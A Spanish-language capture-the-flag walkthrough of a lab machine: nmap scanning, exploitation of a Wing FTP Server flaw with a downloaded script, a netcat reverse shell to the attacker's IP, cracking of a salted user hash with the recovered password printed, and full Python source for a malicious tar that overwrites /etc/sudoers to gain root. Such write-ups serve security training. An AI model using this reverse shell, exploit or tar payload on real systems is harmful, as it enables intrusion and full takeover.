
# Reconocimineto

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.6.141 -oG allPorts
```

```sehll
 [*] IP Address: 10.129.6.141
 [*] Open ports: 22,80
```

```shell
nmap -p22,80 -sCV -vvv 10.129.6.141 -oN targeted
```

EN la web encontramos un área de clientes bajo el subdominio `ftp.wingdata.htb`

Vemos que la versión es `Wing FTP Server v7.4.3` buscando en internet vemos que pertenece al `CVE-2025-47812`

# Explotacion
## CVE-2025-47812

Buscamos el exploit y nos lo descargamos para poder ejecutarlo `https://www.exploit-db.com/exploits/52347`

Lo ejecutamos buscando saber que usuario somos 
```shell
python3 52347.py -u http://ftp.wingdata.htb -c whoami
```

Nos devuelve que somos el usuario `wingftp`

Vamos a intentar mandarnos una reverse shell, despues de probar diferentes tipos de shell vemos que la nos ha funcionado es 
```shell
busybox nc 10.10.15.216 443 -e sh
```


Obtenemos una shell como como el usuario `wingftp`
En la rutA `/opt/wftpserver/Data/1/users` encontramos archivos de configuracion de diferentes usuarios, en este caso leeremos el de `wacky` en el cual entromas un hash el cual podremos romper
```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

Primero deberemos de crear un rockyou salted usando el nombre del servicio del `FTP`
```shell
sed 's/$/WingFTP/' /usr/share/wordlists/rockyou.txt > rockyou_salted.txt
```

Se lo pasaremos a [[HASHCAT]] 
```shell
hashcat hash rockyou_salted.txt -m 1400
```

Conseguimos la contraseña
```ad-hint
wacky::!#7Blushing^*Bride5
```

Obteniendo una shell como `wacky`
 ejecutamos el comonado 
 ```shell
 sudo -l
 ```

En `/tmp` crearemos un archivo llamado `cve.py`
```python
import tarfile
import os
import io
import sys

# Create a malicious tar that exploits CVE-2025-4517
# This will write to /etc/sudoers (or /etc/passwd) outside the extraction directory

comp = 'd' * 247  # For Linux
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    # Create directory structure with symlinks
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
    
    # Create the long symlink that bypasses PATH_MAX check
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)
    
    # Create escape symlink pointing to /etc
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(e)
    
    # Create a hardlink to /etc/sudoers
    f = tarfile.TarInfo("sudoers_link")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"
    tar.addfile(f)
    
    # Now overwrite /etc/sudoers with our malicious content
    content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
    c = tarfile.TarInfo("sudoers_link")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))
    
print("[+] Malicious tar backup_9999.tar created")
```

Lo ejecutamos con
```shell
python3 cve.py
```


Y nos crea automaticamente un archivo llamdado `backup_9999.tar` movemos el nuevo archivo a
```shell
mv /tmp/backup_9999.tar /opt/backup_clients/backups
```

Y lo ejecutamos
```shell
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_pwn
```

Ejecutaremos
```shell
sudo su
```

Y obtendremos una shell como root

